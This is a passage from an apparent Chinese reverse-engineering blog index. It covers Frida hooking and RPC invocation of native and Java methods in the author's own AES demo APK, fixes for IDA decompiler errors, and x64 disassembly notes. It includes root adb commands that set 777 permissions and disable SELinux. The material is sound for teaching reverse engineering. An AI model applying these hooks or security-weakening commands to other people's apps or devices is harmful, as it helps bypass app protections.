","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:1:4","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"测试Apk 下方代码示例中主要写了一个静态的Native函数method01以及动态的实例函数method02. Java代码: package com.example.luodemo; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luodemo.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { private static final String TAG = \"[XiaLuoHun]\"; // Used to load the 'luodemo' library on application startup. static { System.loadLibrary(\"luodemo\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); while(true){ try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Log.i(TAG, method01(\"LuoHun\")); Log.i(TAG, method02(method01(\"LuoHun\"))); } } /** * A native method that is implemented by the 'luodemo' native library, * which is packaged with this application. */ public native String stringFromJNI(); /** * AES加密, CBC, PKCS5Padding */ public static native String method01(String str); /** * AES解密, CBC, PKCS5Padding */ public native String method02(String str); } C代码: #include \u003cjni.h\u003e #include \u003cstring\u003e #include \"aes_utils.h\" #include \"tools.h\" #include \"junk.h\" #define NELEM(x) ((int) (sizeof(x) / sizeof((x)[0]))) extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodemo_MainActivity_stringFromJNI( JNIEnv* env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } jstring JNICALL method01(JNIEnv *env, jclass jcls, jstring str_) { if (str_ == nullptr) return nullptr; const char *str = env-\u003eGetStringUTFChars(str_, JNI_FALSE); char *result = AES_128_CBC_PKCS5_Encrypt(str); env-\u003eReleaseStringUTFChars(str_, str); jstring jResult = getJString(env, result); free(result); return jResult; } JNIEXPORT jstring JNICALL method02(JNIEnv *env, jobject jcls, jstring str_) { if (str_ == nullptr) return nullptr; const char *str = env-\u003eGetStringUTFChars(str_, JNI_FALSE); char *result = AES_128_CBC_PKCS5_Decrypt(str); env-\u003eReleaseStringUTFChars(str_, str); jstring jResult = getJString(env, result); free(result); return jResult; } JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved){ JNIEnv *env; vm-\u003eGetEnv((void **) \u0026env, JNI_VERSION_1_6); JNINativeMethod methods[] = { {\"method01\", \"(Ljava/lang/String;)Ljava/lang/String;\", (void *) method01}, {\"method02\", \"(Ljava/lang/String;)Ljava/lang/String;\", (void *) method02}, }; env-\u003eRegisterNatives(env-\u003eFindClass(\"com/example/luodemo/MainActivity\"), methods, NELEM(methods)); return JNI_VERSION_1_6; } ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:2:0","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"Java层主动调用与RPC ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:3:0","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"Js Hook function hookMethod01(){ Java.perform(function(){ var MainActivity = Java.use('com.example.luodemo.MainActivity') MainActivity.method01.implementation = function(str){ var result = this.method01(str)//Hook时的主动调用 console.log('str =\u003e', str) console.log('result =\u003e', result) return result } }) } function invokeMethod01(plainText){ var result = '' Java.perform(function(){ var MainActivity = Java.use('com.example.luodemo.MainActivity') var javaString = Java.use('java.lang.String') //var plainText = 'LuoHun' result = MainActivity.method01(javaString.$new(plainText)) console.log('plainText =\u003e', plainText) console.log('result =\u003e', result) }) return result } function invokeMethod02(cipherText){ var result = '' Java.perform(function(){ Java.choose('com.example.luodemo.MainActivity',{ onMatch:function(instance){ var javaString = Java.use('java.lang.String') //var cipherText = '64a91c1b8eedb22b9c28d4b98e16ecc3' result = instance.method02(javaString.$new(cipherText)) console.log('cipherText =\u003e', cipherText) console.log('result =\u003e', result) }, onComplete(){ } }) }) return result } rpc.exports={ method01:invokeMethod01, method02:invokeMethod02 } // function main(){ // //hookMethod01() // //invokeMethod01('LuoHun') // invokeMethod02('64a91c1b8eedb22b9c28d4b98e16ecc3') // } // setImmediate(main()) ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:3:1","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"Python调用 import frida import time import json def on_message(message, payload): print(message) print(payload) # 无线连接 # /data/local/tmp/frida-server -l 0.0.0.0:6666 # Wifi ADB监听IP和端口为192.168.2.111:5555 #device = frida.get_device_manager().add_remote_device(\"192.168.2.111:6666\") # 有线连接 device = frida.get_usb_device() # 启动App pid = device.spawn(['com.example.luodemo']) device.resume(pid) time.sleep(1) session = device.attach(pid) # 加载脚本 with open(\"LuoHook.js\", encoding=\"UTF-8\") as f: script = session.create_script(f.read()) script.on('message', on_message) #调用消息处理 script.load() api = script.exports #获取导出函数列表 print('method01 =\u003e encode_result: ' + api.method01('LuoHun')) print('method02 =\u003e decode_result: ' + api.method02('64a91c1b8eedb22b9c28d4b98e16ecc3')) input() ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:3:2","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"Native层函数主动调用 ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:4:0","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"Hook静态注册的JNI函数 可以使用IDA或者如下的Objection命令来查看指定库文件的导出符号. memory list exports libluodemo.so --json Luo.json 以Hook stringFromJNI函数为例. function hookMethod(){ var stringFromJNI = Module.findExportByName('libluodemo.so','Java_com_example_luodemo_MainActivity_stringFromJNI') //var libluodemo_addr = Module.findBaseAddress(\"libluodemo.so\") //var stringFromJNI = libluodemo_addr.add(0x1FBE0) //打开IDA看偏移 Interceptor.attach(stringFromJNI, { onEnter:function(args){ //console.log('Enter stringFromJNI') }, onLeave:function(retval){ var env = Java.vm.getEnv() //构造一个新字符串 var jstrings = env.newStringUtf(\"Hello XiaLuoHun\"); //替换返回值 retval.replace(jstrings); } }) } function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function(args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function(retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function(args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); if (path.indexOf(\"libluodemo.so\") \u003e= 0) { this.target = true; } } }, onLeave: function(retval) { if (this.target) { hookMethod() } } }); } setImmediate(hook_dlopen); ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:4:1","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"Hook动态注册的JNI函数 首先使用下方仓库中的hook_RegisterNatives.js脚本来获取动态注册后函数的所在地址. https://github.com/lasting-yang/frida_hook_libart 可写出Hook动态注册的Native函数method01代码如下: function hookMethod(){ var libluodemo_addr = Module.findBaseAddress(\"libluodemo.so\") var method01 = libluodemo_addr.add(0x1fd64) //方式一 // Interceptor.attach(method01, { // onEnter:function(args){ // console.log('args[2] =\u003e', Java.vm.getEnv().getStringUtfChars(args[2], null).readCString()) // }, // onLeave:function(retval){ // console.log('retval =\u003e', Java.vm.getEnv().getStringUtfChars(retval, null).readCString()) // } // }) //方式二 var addr_func = new NativeFunction(method01, 'pointer', ['pointer', 'pointer', 'pointer']) Interceptor.replace(method01, new NativeCallback(function(arg0, arg1, arg2){ var result = addr_func(arg0, arg1, arg2) //Hook中的主动调用 console.log('arg2 =\u003e', Java.vm.getEnv().getStringUtfChars(arg2, null).readCString()) console.log('result =\u003e', Java.vm.getEnv().getStringUtfChars(result, null).readCString()) return result }, 'pointer', ['pointer', 'pointer', 'pointer'])) } function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function(args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function(retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function(args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); if (path.indexOf(\"libluodemo.so\") \u003e= 0) { this.target = true; } } }, onLeave: function(retval) { if (this.target) { hookMethod() } } }); } setImmediate(hook_dlopen); ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:4:2","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"主动调用 从上面Hook的第二种方式,可以得到下述的主动调用代码. function invoke_func(addr, contents){ var result = null var func = new NativeFunction(addr, 'pointer', ['pointer', 'pointer', 'pointer']) Java.perform(function(){ var env = Java.vm.getEnv() var jstring = env.newStringUtf(contents) result = func(env,ptr(1), jstring) result = env.getStringUtfChars(result, null) }) return result } function inmvoke_method01(){ var base = Module.findBaseAddress(\"libluodemo.so\") var method01_addr = base.add(0x1fd64) var result = invoke_func(method01_addr, 'LuoHun') console.log('result =\u003e', result.readCString()) } setImmediate(inmvoke_method01); 注意 在JNI函数中,第一个参数一定是JNIEnv的指针,第二个参数取决于对应JNI函数在Java层中是静态还是动态函数,分别对应jclass类型和jobject类型.若第二个参数没有使用则可以任意传递相同类型的数据,否则就需要通过env对象进行构造. ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:4:3","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"主动加载模块并调用其中的函数 解压Apk,将对应的模块推送到手机的/data/app目录下,并以Root身份赋予所有权限. adb push .\\libluodemo.so /data/local/tmp adb shell su mv libluodemo.so /data/app chmod 777 /data/app/libluodemo.so //关闭selinux setenforce 0 加载模块并自动调用的函数代码如下: function invoke_func(addr, contents){ var result = null var func = new NativeFunction(addr, 'pointer', ['pointer', 'pointer', 'pointer']) Java.perform(function(){ var env = Java.vm.getEnv() var jstring = env.newStringUtf(contents) result = func(env,ptr(1), jstring) result = env.getStringUtfChars(result, null) }) return result } function inmvoke_method01(){ var base = Module.load('/data/app/libluodemo.so').base var method01_addr = base.add(0x1fd64) var result = invoke_func(method01_addr, 'LuoHun') console.log('result =\u003e', result.readCString()) } setImmediate(inmvoke_method01); ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:4:4","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["IDA"],"content":"JUMPOUT(xxxx) ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:1:0","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"样本 修复我1.exe ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:1:1","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"原因 Jmp到一个未知值的时候,IDA就会出现这种错误. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:1:2","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"修复 将上图内红框中的汇编,nop掉即可. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:1:3","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"修复调用约定 ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:2:0","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"样本 修复我2.exe ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:2:1","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"原因 从上图发现,v3的值来自edx. 从上图可以看到,edx是sub_401020函数的返回值. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:2:2","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"修复 指明函数的返回值是edx. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:2:3","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"sp-analysis failed ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:3:0","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"样本 修复我3.exe ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:3:1","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"原因 这种情况通常是由Call造成的. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:3:2","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"修复 loc_xxxx是指一段未知的指令集. sub_xxxx是指函数. 将上述Call指令修改为JMP. 最后在ret的地方,设置为函数尾. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:3:3","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Win相关"],"content":"寄存器 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:1:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"函数调用约定 四寄存器fast-call调用约定,调用方平栈,一般是函数开头申请栈空间,函数结尾平栈. 整型参数: 前4个参数传入指定的寄存器RCX, RDX, R8, R9,其余参数传递到堆栈. 浮点参数: 前4个参数将传入XMM0到XMM3的寄存器,其余参数传递到堆栈. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:2:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"栈空间 会有0x20字节的预留空间,一般用来存放4个寄存器RCX,RDX,R8,R9中的值. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:3:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"汇编版HelloWorld #hello.asm includelib user32.lib includelib kernel32.lib extrn MessageBoxA:proc extrn ExitProcess:proc NULL EQU 0 MB_OK EQU 0 .const MSG1 db \"Hello World!\", 0 TITLE1 db \"Luo\", 0 .code START proc ;栈地址必须保证模16, 申请栈空间保证模8 ;栈预留空间32（20h)个字节 sub rsp, 28h mov rcx, NULL mov rdx, offset MSG1 mov r8, offset TITLE1 mov r9d, MB_OK call MessageBoxA mov ecx, 0 call ExitProcess add rsp, 28h RET START endp end 编译 ml64 /c hello.asm link /subsystem:windows /entry:START hello.obj 注意 栈地址必须模16,因为你函数内调用API时,API内会用到多媒体指令,极大可能会使用movaps这个指令,这个指令要求栈地址必须模16,否则程序会崩.故申请的栈空间大小要求模8.其实在系统断点处,栈地址是模16的,但由于经过了CAll指令才到达入口断点,此时栈会抬高8字节,变成模8. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:4:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"定位入口函数 Main函数走完,会退进程,调用exit,故离exit最近的一个三参数函数就是Main函数. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:5:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"iob数组 #define stdin (__acrt_iob_func(0)) #define stdout (__acrt_iob_func(1)) #define stderr (__acrt_iob_func(2)) iob参数: 为1的话,可以命名该函数为printf. 为0的话,可以命名该函数为scanf. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:6:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"函数 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:7:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"传参 参数是结构体大小为8字节: struct tagPoint { int x1; int y1; }; void fun(tagPoint pt) { printf(\"x=%d y=%d\\r\\n\", pt.x1, pt.y1); } int main(int argc, char* argv[]) { tagPoint pt = { 1, 2 }; fun(pt); system(\"pause\"); return 0; } Debug 特征 直接使用RCX传参,函数内拆开. 参数是结构体大小超过8字节: struct tagPoint{ int x1; int y1; int x2; int y2; }; void fun(tagPoint pt) { printf(\"x1=%d y1=%d x2=%d y2=%d\\r\\n\", pt.x1, pt.y1, pt.x2, pt.y2); } int main(int argc, char* argv[]) { tagPoint pt = { 1, 2, 3, 4 }; fun(pt); system(\"pause\"); return 0; } Debug 特征 会出现栈拷贝. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:7:1","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"返回值 如果返回类型为int或long long, 则放在RAX. 如果返回类型为float或double,则放在xmm0. 返回结构体大小为8字节: 放在RAX中. 返回结构体大小超过8字节: struct tagPoint{ int x1; int y1; int x2; int y2; }; tagPoint fun() { tagPoint pt = { 1, 2, 3, 4 }; return pt; } int main(int argc, char* argv[]) { tagPoint pt = fun(); system(\"pause\"); return 0; } Debug 特征 函数多了一个参数. 函数内返回时,以参数为目标做memcpy,并返回参数1. 注意 对低32位寄存器赋值,高32位自动清零.也就是说,如当我们看到函数传参,mov ecx, 2.不能说明参数为4字节,要看函数内使用的是RCX还是ECX. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:7:2","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"变量相关 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:8:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"局部变量 int main(int argc, char* argv[]) { int nNum1 = 1; int nNum2 = 2; printf(\"%d\\r\\n\", nNum1 + nNum2); system(\"pause\"); return 0; } Debug 特征 先定义的在低地址,后定义的在高地址,且不相邻. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:8:1","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"全局变量 int g_nNum1 = 1; int g_nNum2 = 2; int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", g_nNum1 + g_nNum2); system(\"pause\"); return 0; } Debug 特征 地址在全局数据区. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:8:2","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"数组 int main(int argc, char* argv[]) { int ary[] = { 1, 2, 3, 4, 5, 6, 7, 8}; printf(\"%d %d\\r\\n\", ary[2], ary[argc]); system(\"pause\"); return 0; } Debug Release 特征 一维数组寻址公式: 数组元素的地址 = 数组首地址 + sizeof(数组类型) x 下标 二维数组寻址公式: 数组元素的地址 = 数组首地址 + sizeof(一维数组类型) x 下标1 + sizeof(数组类型) x 下标2 Debug版和Release版的寻址公式,同32位. 不同的是64位Release版,数组初始化使用多媒体指令. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:9:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"流程控制语句 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:10:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"IF 单分支 int main(int argc, char* argv[]) { if (argc \u003e 1) { printf(\"argc \u003e 1\\r\\n\"); } system(\"pause\"); return 0; } Release 特征识别 图形识别 虚线:条件跳转. 实线:无条件跳转. 每一个点代表一行汇编代码. if语句中有一个jxx跳转,因此会有一个向下的虚线箭头. 看到上图中标红区域的图形,即可判断其为if语句. 双分支 int main(int argc, char* argv[]) { if (argc == 1) { printf(\"argc == 1\\r\\n\"); } else { printf(\"argc != 1\\r\\n\"); } system(\"pause\"); return 0; } Debug 特征识别 图形识别 因为if语句中有一个jxx指令用于向下跳转,所以会有一个向下的虚线箭头. 又因为else语句中有jmp跳转,所以虚线箭头中会有一个向下的实线箭头. 看到上图中标红区域的图形,即可判断为if...else语句, 虚线箭头之间的代码为if代码,实线箭头之间的代码为else代码. 多分支 int main(int argc, char* argv[]) { if (argc \u003e 2) { printf(\"argc \u003e 2\\r\\n\"); } else if(argc == 2) { printf(\"argc == 2\\r\\n\"); } else { printf(\"argc \u003c 2\\r\\n\"); } system(\"pause\"); return 0; } Debug 特征识别 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:10:1","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"SwitchCase 同32位. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:10:2","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"循坏语句 同32位. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:10:3","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"除法 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:11:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无符号除法 除数为2的幂 int main(int argc, char* argv[]) { printf(\"argc / 16 = %u\", (unsigned)argc / 16); system(\"pause\"); return 0; } 除数为非2的幂 MagicNumber无进位 int main(int argc, char* argv[]) { printf(\"argc / 3 = %I64u\", (unsigned long long)argc / 3); system(\"pause\"); return 0; } 特征 x / 除数 = x * M64 \u003e\u003e (64 + n) 还原 除数 = 2 ^ (64 + n) / M64, 向上取整 MagicNumber有进位 int main(int argc, char* argv[]) { printf(\"argc / 7 = %u\", (unsigned)argc / 7); system(\"pause\"); return 0; } 特征 乘减移加移 x / 除数 = (((x - (x * M \u003e\u003e 32)) \u003e\u003e n1) + (x * M \u003e\u003e 32)) \u003e\u003e n2 还原 除数 = 2 ^ (32 + n) / (2 ^ 32 + M), 向上取整 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:11:1","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"有符号除法 除数为正2的幂 int main(int argc, char* argv[]) { printf(\"argc / 8 = %d\", argc / 8); system(\"pause\"); return 0; } 特征 x \u003e= 0:x / 除数 = x \u003e\u003e n x \u003c 0 :x / 除数 = (x + (2 ^ n - 1)) \u003e\u003e n 还原 除数 = 2 ^ n 除数为正非2的幂 MagicNumber为正 int main(int argc, char* argv[]) { printf(\"argc / 9 = %lld\", (long long)argc / 9); system(\"pause\"); return 0; } 特征 x \u003e= 0: x / 除数 = x * M64 \u003e\u003e (64 + n) x \u003c 0: x / 除数 = ((x * M64) \u003e\u003e (64 + n)) + 1) 还原 除数 = 2 ^ (64 + n) / M64, 向上取整 MagicNumber为负 int main(int argc, char* argv[]) { printf(\"argc / 7 = %d\", argc / 7); system(\"pause\"); return 0; } 特征 x \u003e= 0: x / 除数 = (x * M + x) \u003e\u003e (32 + n) x \u003c 0: x / 除数 = ((x * M + x) \u003e\u003e (32 + n)) + 1) 还原 除数 = 2 ^ (32 + n) / M, 向上取整 除数为负2的幂 int main(int argc, char* argv[]) { printf(\"argc / -16 = %lld\", (long long)argc / -16); system(\"pause\"); return 0; } 除数为负非2的幂 MagicNumber为正 int main(int argc, char* argv[]) { printf(\"argc / -7 = %d\", argc / -7); system(\"pause\"); return 0; } 特征 x \u003e= 0: x / 除数 = (x * M - x) \u003e\u003e (32 + n) x \u003c 0: x / 除数 = ((x * M - x) \u003e\u003e (32 + n)) + 1) 还原 除数 = 2 ^ (32 + n) / 